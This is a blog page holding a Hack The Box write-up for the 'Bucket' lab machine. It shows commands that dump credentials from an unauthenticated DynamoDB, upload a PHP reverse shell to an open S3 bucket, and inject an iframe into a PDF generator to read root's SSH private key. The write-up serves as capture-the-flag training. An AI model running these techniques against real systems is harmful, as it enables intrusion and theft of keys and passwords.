<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Bucket" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Bucket is medium rated linux box, which is mostly about exploiting common bucket miscofigurations. Bucket is based on AWS technology(DynamoDB,S3)" /><meta property="og:description" content="Bucket is medium rated linux box, which is mostly about exploiting common bucket miscofigurations. Bucket is based on AWS technology(DynamoDB,S3)" /><link rel="canonical" href="https://an9k0r.github.io/posts/Bucket/" /><meta property="og:url" content="https://an9k0r.github.io/posts/Bucket/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-15T11:33:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Bucket" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Bucket is medium rated linux box, which is mostly about exploiting common bucket miscofigurations. Bucket is based on AWS technology(DynamoDB,S3)","headline":"Bucket","dateModified":"2022-09-15T11:33:00+02:00","url":"https://an9k0r.github.io/posts/Bucket/","datePublished":"2022-09-15T11:33:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/Bucket/"},"@context":"https://schema.org"}</script><title>Bucket | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Bucket</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 694 515'%3E%3C/svg%3E" data-src="/assets/images/7f0a9f192494c91120cc36b44193b2a20f3c4a850aba562da5116bb6bdfe871b.png" class="preview-img bg" alt="image alternative text" width="694" height="515" data-proofer-ignore><h1 data-toc-skip>Bucket</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-09-15 11:33:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Thu, Sep 15, 2022, 11:33 AM +0200" >Sep 15, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1036 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><p><strong>Bucket is medium rated linux box, which is mostly about exploiting common bucket miscofigurations. Bucket is based on AWS technology(DynamoDB,S3)</strong></p><h1 id="enumeration">ENUMERATION</h1><h2 id="nmap">NMAP<a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s start NMAP:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>Nmap scan report for 10.10.10.212
Host is up (0.035s latency).
Not shown: 968 closed ports
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)

80/tcp    open     http            Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/

Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><h2 id="webpage-on-port-80">WebPage on port 80<a href="#webpage-on-port-80" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Add <code class="language-plaintext highlighter-rouge">bucket.htb</code> to hosts. We can see the webpage:</p><p><img data-src="/assets/images/48f7e652761359b12830788b26cdda2bb4c48bf833c5b56a9631872bea2f7363.png" alt="picture 32" data-proofer-ignore></p><p>After checking the source, we should add <code class="language-plaintext highlighter-rouge">s3.bucket.htb</code> to hosts file and check that page.</p><p><img data-src="/assets/images/02d2a052190a4829e6b67bbd854f5378543e464034982c54a27d21c84898e0c1.png" alt="picture 33" data-proofer-ignore></p><p>Checking the <code class="language-plaintext highlighter-rouge">s3</code>:</p><p><img data-src="/assets/images/cc31fbc44d3dd0c9b39fa2926cad4344ee7b764278a7654e2c3721dbc57a3dad.png" alt="picture 34" data-proofer-ignore></p><h2 id="gobuster">gobuster<a href="#gobuster" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Gobuster finds two directories:</p><p><img data-src="/assets/images/41cc2918134cc87638fb18188a4a730e076fb98129543f1d58ce18e4c47c1752.png" alt="picture 35" data-proofer-ignore></p><h2 id="directory-enumeration">Directory enumeration<a href="#directory-enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="s3buckethtbhealth">s3.bucket.htb/health<a href="#s3buckethtbhealth" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Without going into the details or checking the google, we can noteice something regarding <code class="language-plaintext highlighter-rouge">dynamodb</code></p><p><img data-src="/assets/images/aa5f8b00572ba2ee5c2466061f90b349127771271e70dade8be5162b32db428b.png" alt="picture 36" data-proofer-ignore></p><h3 id="s3buckethtbshell">s3.bucket.htb/shell<a href="#s3buckethtbshell" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Shell makes some kind of redirection</p><p><img data-src="/assets/images/77de82c7d84f14568bf6be8a4da27358d5aa5381554c0d54e3e279ef542a705d.png" alt="picture 37" data-proofer-ignore></p><h2 id="awscli">AWSCLI<a href="#awscli" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Apparently there is a way to interact with AWS Buckets using “awscli” which can be installed with apt!</p><p>Following “default” configuration will be used.</p><p><img data-src="/assets/images/9f6448da30bca2dae46022213d9fb107d119f038a0079c28f0d3c598e56a351a.png" alt="picture 38" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>luka@kali:~/htb/bucket$ aws configure
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [None]: us-west-2
Default output format [None]: json
</pre></table></code></div></div><p>After configuration, i’ve checked what commands i can run. Listing of buckets</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>luka@kali:~/htb/bucket/lazys3$ aws s3 ls --endpoint-url http://s3.bucket.htb --no-sign-request
2021-01-26 13:05:03 adserver
</pre></table></code></div></div><p>Another command that can be used is dynamodb (few screenshots above, we’ve seen that s3 and dynamodb services are running.)</p><p>This is the main difference between s3 and dynamodb:</p><blockquote><p>S3 is an object store, designed for large binary unstructured data. It can store individual objects up to 5 TB. The objects are aggregated into buckets. A bucket is like a namespace or a database table, or, if you prefer a file system analogy, it is like a disk drive. Buckets are always located in a particular region. You can easily set up cross-region replication for faster local access or backups. However, generally it’s best if one region is the reference data source, because multi-master replication with S3 is not easy to set up.</p></blockquote><blockquote><p>DynamoDB is a document database, or, if you like buzzwords, a NoSQL database. Although it can keep binary objects as well, it’s really designed for storing structured textual (JSON) data, supporting individual items up to 400 KB. DynamoDB stores items in tables, which can either be in a particular region or globally replicated. DynamoDB Global Tables supports multi-master replication, so clients can write into the same table or even the same item from multiple regions at the same time, with local access latency.</p></blockquote><p>Reference: https://serverless.pub/s3-or-dynamodb/</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>luka@kali:~/htb/bucket/lazys3$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/ --no-sign-request
{
    "TableNames": [
        "users"
    ]
}
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>luka@kali:~/htb/bucket/lazys3$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/ --no-sign-request
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-&lt;_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
</pre></table></code></div></div><p>Few usernames and passwords were found, but they cannot be anywhere right now.</p><h1 id="exploitation">Exploitation</h1><h2 id="getting-shell-onto-s3">Getting shell onto S3<a href="#getting-shell-onto-s3" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can upload to s3! So let’s upload PHP Reverse shell which we can execute on <code class="language-plaintext highlighter-rouge">bucket.htb</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>luka@kali:~/htb/bucket$ aws s3 cp indexl.php s3://adserver/indexl.php --endpoint-url http://s3.bucket.htb --no-sign-request
upload: ./index.php to s3://adserver/index.php
</pre></table></code></div></div><p>Upload was successful</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>luka@kali:~/htb/bucket$ aws s3 ls s3://adserver/ --endpoint-url http://s3.bucket.htb --no-sign-request
                           PRE images/
2021-01-26 13:35:04       5344 index.html
2021-01-26 13:36:01       2397 index.php
</pre></table></code></div></div><p>And run it!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl http://bucket.htb/index.php
</pre></table></code></div></div><p>Reverse shell was spawned:</p><p><img data-src="/assets/images/fe4f49ab938f4eac27128d5f96a5b6744c0d6afe9e48e773969709e69a23e16e.png" alt="picture 39" data-proofer-ignore></p><h2 id="finding-ssh-access-as-roy">Finding SSH access as Roy<a href="#finding-ssh-access-as-roy" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>After checking the /etc/passwd, there is one potential user with password &gt; roy, and credentials found before =&gt; “n2vM-&lt;_K_Q:.Aa2” which worked for ssh.</p><p><img data-src="/assets/images/29be187a1a605ce4d5c291eaeabaa4aa5738ba5d30a1f96c1a0b74dd1f438947.png" alt="picture 40" data-proofer-ignore></p><h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1><h2 id="local-enumeration">Local Enumeration<a href="#local-enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/a706760bb2c8d0cb98ef470349fd68b3f3a93098aada383852b655419c34bf99.png" alt="picture 41" data-proofer-ignore></p><p>There is something else running locally on ports 8000 and 40951 (Port 4566 = 4566 dynamodb) as <code class="language-plaintext highlighter-rouge">root</code>! Port 40591 returns 404 so lets try port 8000</p><p><img data-src="/assets/images/aa8535740c913912564e3c71fa63ee51d57bc9eb7d65d3abf51cab8ec7dc8484.png" alt="picture 42" data-proofer-ignore></p><p>According to the title, this might be interessting to us:</p><p><img data-src="/assets/images/ef4cc017306563672df5bc9d192ca63b7fbf78febe1bd0c362ec447dffd8f130.png" alt="picture 43" data-proofer-ignore></p><p>Let’s set a tunnel (SSH local listener) on Kali:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh -L 8888:127.0.0.1:8000 -q -C -N roy@10.10.10.212
</pre></table></code></div></div><p>Unfortunately after checking the source code, this site doesn’t seem to do anything and it’s a static site.</p><p><img data-src="/assets/images/92b23b5e276af1647197c826a6700ab970b0dc91ee2ca06ad60c780cea70c35c.png" alt="picture 44" data-proofer-ignore></p><p><img data-src="/assets/images/ad731f2917ea44aeba06961a33ca3d227f59ec776ab69e2c8a9079ea9d106c4b.png" alt="picture 45" data-proofer-ignore></p><h2 id="adding-alerts-table-to-dynamodb">Adding alerts table to dynamodb<a href="#adding-alerts-table-to-dynamodb" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Checking the index.php it seems like the script starts another dynamodb instance with TableName = alerts, etc.</p><p>This here will get tricky.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="n">roy</span><span class="o">@</span><span class="n">bucket</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">bucket</span><span class="o">-</span><span class="n">app</span><span class="err">$</span> <span class="n">cat</span> <span class="n">index</span><span class="mf">.</span><span class="n">php</span>                                                                        
<span class="o">&lt;?</span><span class="n">php</span>                                                     
<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>                  
<span class="kn">use</span> <span class="nc">Aws\DynamoDb\DynamoDbClient</span><span class="p">;</span>                                                                                     
<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span><span class="o">===</span><span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>                                                                            
        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"action"</span><span class="p">]</span><span class="o">===</span><span class="s2">"get_alerts"</span><span class="p">)</span> <span class="p">{</span>             
                <span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'America/New_York'</span><span class="p">);</span>                                                       
                <span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DynamoDbClient</span><span class="p">([</span>                                                                       
                        <span class="s1">'profile'</span> <span class="o">=&gt;</span> <span class="s1">'default'</span><span class="p">,</span>                                                                      
                        <span class="s1">'region'</span>  <span class="o">=&gt;</span> <span class="s1">'us-east-1'</span><span class="p">,</span>                                                                    
                        <span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span><span class="p">,</span> 
                        <span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://localhost:4566'</span>
                <span class="p">]);</span>                                                                                                  
                                                          
                <span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">getIterator</span><span class="p">(</span><span class="s1">'Scan'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                        <span class="s1">'TableName'</span> <span class="o">=&gt;</span> <span class="s1">'alerts'</span><span class="p">,</span>                                                                                                                                                                                           
                        <span class="s1">'FilterExpression'</span> <span class="o">=&gt;</span> <span class="s2">"title = :title"</span><span class="p">,</span>
                        <span class="s1">'ExpressionAttributeValues'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">":title"</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">"S"</span><span class="o">=&gt;</span><span class="s2">"Ransomware"</span><span class="p">)),</span>                                                                                                                                          
                <span class="p">));</span>                                       
                                                          
                <span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>  
                        <span class="nv">$name</span><span class="o">=</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span><span class="mf">.</span><span class="s1">'.html'</span><span class="p">;</span>
                        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'files/'</span><span class="mf">.</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]);</span>
                <span class="p">}</span>                                         
                <span class="nb">passthru</span><span class="p">(</span><span class="s2">"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="nv">$name</span><span class="s2"> 800 A4 -out files/result.pdf"</span><span class="p">);</span>
        <span class="p">}</span>                                                                                                            
<span class="p">}</span>                                                 
<span class="k">else</span>                                              
<span class="p">{</span>                                             
<span class="cp">?&gt;</span> 
</pre></table></code></div></div><p>We have seen the users table on <code class="language-plaintext highlighter-rouge">dynamodb</code> and but no <code class="language-plaintext highlighter-rouge">alerts</code> table. We can see in th script above that that script produces a PDF file and does not sanitize any input.</p><p>So let’s create the <code class="language-plaintext highlighter-rouge">alerts</code> table on s3:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://s3.bucket.htb
</pre></table></code></div></div><p>Table was created. this is the output</p><p><img data-src="/assets/images/8e142ef806ca7c849f41f0c341a00aad41fa88d0908debee2b02a7dbef2ea293.png" alt="picture 46" data-proofer-ignore></p><h2 id="htmliframe-injection">HTML/iframe injection<a href="#htmliframe-injection" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now its time to put a row/item to the table, which is going to be read when running the script.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"},"data": {"S": "&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;iframe src='/root/.ssh/id_rsa'&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;"}}' --return-consumed-capacity TOTAL --endpoint-url http://s3.bucket.htb
</pre></table></code></div></div><h2 id="getting-privileged-shell">Getting privileged shell<a href="#getting-privileged-shell" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now just call <code class="language-plaintext highlighter-rouge">curl --data "action=get_alerts" http://localhost:8000/</code> and grab the results.pdf.</p><p>Convert openssh private key to rsa private key and set the privileges to <code class="language-plaintext highlighter-rouge">chmod 600</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh-keygen -p -N "" -m pem -f id_rsa_openssh
